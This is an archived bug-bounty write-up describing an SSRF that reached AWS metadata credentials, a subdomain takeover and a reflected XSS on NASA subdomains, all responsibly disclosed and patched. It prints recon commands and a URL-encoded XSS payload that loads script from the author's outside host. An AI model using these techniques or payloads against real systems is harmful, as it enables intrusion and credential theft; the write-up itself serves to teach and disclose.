# Hacking NASA

- **Source URL:** https://nickguitar.medium.com/hacking-nasa-critical-ssrf-subdomain-takeover-xss-699be0ce3c06?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250418031828/https://nickguitar.medium.com/hacking-nasa-critical-ssrf-subdomain-takeover-xss-699be0ce3c06?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6247 (id 6247)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Hacking NASA: Critical SSRF + Subdomain Takeover + XSS

A couple of months ago, I was really excited about doing bug bounty on NASA. Just like any other giant company, they have tons of services and webpages publicly available, and it is really hard for them to keep track of everything. Some of the websites they own are running old, deprecated, and vulnerable applications that shouldn’t even be online. It was those kinds of systems that I was searching for.

I first did some recon, enumerating as many subdomains as I could. At that time, there were about six domains in scope for their program, but I focused on one of them, which I will call `target.gov`, which is a domain owned by NASA added to their bug bounty program the week before. Since it had not been tested by other hackers before, I thought the chances of finding something juicy would be higher.

Here, I did nothing special; I just ran a bunch of different tools and methods to try to harvest lots of subdomains.

```
amass enum -passive -d target.gov
amass db -names -d target.gov
sublist3r -d target.gov
subfinder -d target.gov
crt.sh target.gov
ffuf -u https://FUZZ.target.gov -w /usr/share/wordlists/dirb/common.txt -p 1
ffuf -u https://target.gov -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.target.gov"
```
After collecting a good amount (about 60) of subdomains of `target.gov` and saving them into targets.txt, I decided to run nuclei with the default templates on them, using these switches:

```
-l: specify a list of targets as input
-fr: follow redirects
-headless: enable templates that require headless browser support
-sa: scan all the IP's associated with DNS record
-o: output file
-c: number of templates to be tested in parallel
-H: set header
```
`nuclei -l targets.txt -fr -sa -headless -c 100 -o nuclei.out -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6284.218 Safari/537.36"`  At the same time, I ran httpx to get some information about the underlying technologies running on those subdomains, using these switches:

```
-l: specify a list of targets as input
-sc: display response status code
-location: display response redirect location
-title: display page title
-server: display server name
-td: display technology in use based on wappalyzer dataset
-ip: display host ip
-t: threads
-o: output file
```
`httpx -l targets.txt -sc -location -title -server -td -ip -t 100 -o httpx.out`
After many hours of manually checking dozens of those subdomains, I came across these, which are all hosted on AWS:

```
(part of httpx output):
https://vis.target.gov [200] [] [Apache] [54.88.xxx.yyy] [vis-prd8-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP Server,HSTS]
https://vis.target.gov [200] [] [Apache] [34.202.xxx.yyy] [vis-prd8-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP Server,HSTS]
https://visdev.target.gov [200] [] [Apache] [54.212.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP Server,HSTS]
https://visdev.target.gov [200] [] [Apache] [54.71.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP Server,HSTS]
https://visstaging.target.gov [200] [] [Apache] [54.167.xxx.yyy] [Apache HTTP Server,HSTS]
https://visstaging.target.gov [200] [] [Apache] [52.21.xxx.yyy] [Apache HTTP Server,HSTS]
https://visdev72.target.gov [301,200] [] [Apache] [54.71.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP Server,HSTS] [https://visdev.target.gov/]
https://visdev72.target.gov [301,200] [] [Apache] [54.212.xxx.yyy] [vis-dev-alb-REDACTED.us-west-2.elb.amazonaws.com] [Apache HTTP Server,HSTS] [https://visdev.target.gov/]
https://visstaging7.target.gov [301,200] [] [Apache] [52.21.xxx.yyy] [vis-stg7-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP Server,HSTS] [https://visstaging.target.gov/]
https://visstaging7.target.gov [301,200] [] [Apache] [54.167.xxx.yyy] [vis-stg7-alb-REDACTED.us-east-1.elb.amazonaws.com] [Apache HTTP Server,HSTS] [https://visstaging.target.gov/]
```
All of them are practically the same page running in different ambient (dev, staging). This is what the pages looked like (same as now):

I then checked my nuclei logs to see if there was anything interesting about `vis.target.gov`, and for my surprise I found this (the same was present on all other `vis*.target.gov`).

```
[geoserver-login-panel] [http] [info] https://visdev.target.gov/geoserver/web/ [2.20.4]
[CVE-2021-40822] [http] [high] https://visdev.target.gov/geoserver/TestWfsPost
```
I immediately focused on that “high” finding and started to do a research about CVE-2021–40822.

# Server-Side Request Forgery

This subdomain has an instance of GeoServer running. GeoServer is open-source software written in Java used to share geospatial data, such as satellite images, climate data, forestry, and water resources. This data can be displayed on Google Maps, MapBox, and other similar map engines.

It turns out that this version of GeoServer had a known Server-Side Request Forgery (SSRF) vulnerability, identified as CVE-2021–40822, discovered by my fellow countryman [Walleson Moura {phor3nsic}](https://web.archive.org/web/20250418031828/https://medium.com/u/c19722691301?source=post_page---user_mention--699be0ce3c06---------------------------------------). He explains the vulnerability with more details in [his article](https://web.archive.org/web/20250418031828/https://webcache.googleusercontent.com/search?q=cache%3Ahttps%3A%2F%2Fgccybermonks.com%2Fposts%2Fcve-2021-40822%2F&oq=cache%3Ahttps%3A%2F%2Fgccybermonks.com%2Fposts%2Fcve-2021-40822%2F&gs_lcrp=EgZjaHJvbWUqBggAEEUYOzIGCAAQRRg7MgYIARBFGDoyBggCEEUYPNIBCDIwMzBqMGoxqAIAsAIA&sourceid=chrome&ie=UTF-8) (which by the time I write this, I can only access via its Google cache).

He also created a [proof of concept exploit](https://web.archive.org/web/20250418031828/https://github.com/phor3nsic/CVE-2021-40822/) and published it on his GitHub. The exploitation is pretty simple. The script tries to make a POST request to `example.com/geoserver/TestWfsPost` with a parameter “url” pointing to the attacker’s URL, and with the “Host” header also pointing to another URL. If any of the URLs get fetched, their contents would be reflected in the response, showing that the target is vulnerable to SSRF.

I then tried to make this PoC on that visdev subdomain. I pointed the POST parameter “url” to a domain where I could check the logs, and also the Host header, and this was the result:

I got a ping from the visdev server, and it already leaked the Java version installed on the server in the User-Agent. So it was confirmed: the server was indeed vulnerable to SSRF. Pretty good news (for me)!

Remember that httpx showed us that all those `vis*.target.gov` subdomains were hosted on AWS? It is well known that SSRF on AWS infrastructure can be devastating. This is because all EC2 instances have access to a specific AWS server at IP address 169.254.169.254. This IP is used by various cloud service providers, such as AWS, to provide metadata to instances. It can return data such as instance ID, type, user data, information about security groups, and more.

I already had a subdomain on my domain configured to point to this metadata server (aws.0x7359.com -> 169.254.169.254). So I used it as the value for both the “url” parameter and the “Host” header. The result was exactly as expected: it listed all the versions of the metadata service.

It’s possible to browse through the directories and read the data. Reading the hostname leaks the internal IP of this instance:

When browsing to `/latest/meta-data/identity-credentials/ec2/security0credentials/ec2-instance`, it’s possible to get some really critical information, such as the AccessKeyId, the SecretAccessKey and the Token.

With this information, it’s possible to authenticate into AWS CLI and continue exploiting, potentially achieving RCE (Remote Code Execution) or even a complete takeover of the infrastructure, depending on the permissions and security configurations.

I didn’t even try to test those credentials, as I was not sure if this was within the scope and I didn’t want to end up on the FBI’s list. I just collected all the evidence I had and started writing the report.

# Subdomain Takeover

A couple of hours after I wrote and submitted the SSRF report to the NASA’s vulnerability disclosure program on [BugCrowd](https://web.archive.org/web/20250418031828/https://bugcrowd.com/nasa-vdp), I got back to my nuclei results for `*.target.gov` and I came a cross another “high” item:

```
[meteor-takeover] [http] [high] http://REDACTED2022.target.gov
[tech-detect:meteor] [http] [info] https://REDACTED2022.target.gov/                                                                                 new_targets/nuclei_new_targets.txt:[meteor-takeover] [http] [high] http://REDACTED2022.target.gov                                                                                       new_targets/nuclei_new_targets.txt:[tech-detect:meteor] [http] [info] https://REDACTED2022.target.gov/  
```
It says “takeover”, so immediately I tried to resolve the DNS to see where it was pointing to.

It was pointing to us-east-1.galaxy-XXXXX.meteor.com, but this DNS was dead. There wasn’t any webpage hosted on that domain. A quick search on Google and I found [this](https://web.archive.org/web/20250418031828/https://infosecwriteups.com/meteor-subdomain-takeover-b33034a44aa7) and [this](https://web.archive.org/web/20250418031828/https://rivalsec.github.io/blog/2022/12/02/meteor.html) articles explaining about this takeover.

In summary, if I created an account on meteor.com, I would be able to reuse this `galaxy-XXXXXX` hostname in the `us-east-1` region and then be able to put anything I wanted on that page. Since the subdomain `REDACTED2022.target.gov` was pointing to that `galaxy-XXXXXX` host, it would reflect the contents of that page, which would be under my control.

So after following the mentioned articles, creating an account on meteor.com, spinning up a Docker container, and setting up everything, I was able to start the web server on that hostname and region:

The application was successfully deployed at `us-east-1.galaxy-XXXXXX.meteor.com`, and I had full control over it. Since `REDACTED2022.target.gov` was pointing to it, I also had control over what was being served on this NASA subdomain.

At that time, I uploaded an index.html with a proof of concept (PoC), and this is what people saw when accessing `REDACTED2022.target.gov`:

Oh, and I actually had to add a credit card to my account and pay $1 to be able to create that page on meteor.com, which was refunded a few days after I deactivated my account.

# XSS

A couple of days after all of that, I went back to `visdev.TARGET.gov`, as there were still many inputs I hadn’t tested yet.

I started to click on everything, used all inputs, tried to register and log in, and tested some common but old things like `' or 1=1`, some XSS, and things like that.

At the same time, a friend of mine was testing the same page, and he was able to find an XSS vulnerability in a specific GET parameter. He used the payload `/?no_welcome=a'-alert(1)//`, which at first glance looked a bit weird, but then it all made sense when I looked at the source code.

The value of this parameter was being used as the value of a variable in the JavaScript code. It was possible to escape from the context of the variable and write arbitrary JavaScript code directly from the URL. I discovered that this behavior was present in many other variables as well.

This was the result:

Although I thought this was enough as a PoC for the XSS, I decided to go a bit further and weaponize the attack with a more versatile payload. This payload makes it possible to write complex malicious JavaScript routines, upload them somewhere, and import them into the HTML code.

```
document.addEventListener('DOMContentLoaded', function(){
  var c = function(){
    a();
  };
  var s = document.createElement('script');
  s.src = 'https://n.0x7359.com/xss.js';
  s.onreadystatechange = c;
  document.body.appendChild(s);
});
```
This would make a request to [https://n.0x7359.com/xss.js](https://web.archive.org/web/20250418031828/https://n.0x7359.com/xss.js) and execute the following code.

```
function a(){
   alert('cross site alert');
}
```
Minifying it and appending it to the JavaScript, we end up with this:

`vis.target.gov/REDACTED/?AutoRefreshInterval=%27;document.addEventListener(%27DOMContentLoaded%27,%20function()%7bvar%20c%20=%20function()%7ba();%7d;var%20s%20=%20document.createElement(%27script%27);s.src%20=%20%27https://n.0x7359.com/xss.js%27;s.onreadystatechange%20=%20c;document.body.appendChild(s);%7d);//`
And the final result is:

An attacker could then use this link in social engineering attacks, gaining full control over what JavaScript code would run on the target’s browser, and would be capable of changing it in real-time.

# Timeline

I reported everything and in two weeks after all of that, NASA patched all the vulnerabilities.

## SSRF:

- 25 Feb 2024: Vulnerability reported
- 26 Feb 2024: NASA requested me the raw HTTP request of the exploit and I provided it
- 27 Feb 2024: They say they can’t replicate because the website if off
- 29 Feb 2024: The site got back online and they validated the vulnerability (severity P1)
- 13 Mar 2024: Vulnerability fixed

## Subdomain Takeover:

- 25 Feb 2024: Vulnerability reported
- 26 Feb 2024: Vulnerability validated (severity P3)
- 04 Mar 2024: Vulnerability fixed

## Cross-Site Scripting:

- 28 Feb 2024: Vulnerability reported
- 28 Feb 2024: Vulnerability validated (severity P3)
- 13 Mar 2024: Vulnerability fixed

Oh, and they also sent me some pretty cool letters “*as a token of our appreciation for your efforts in detecting this vulnerability*”:
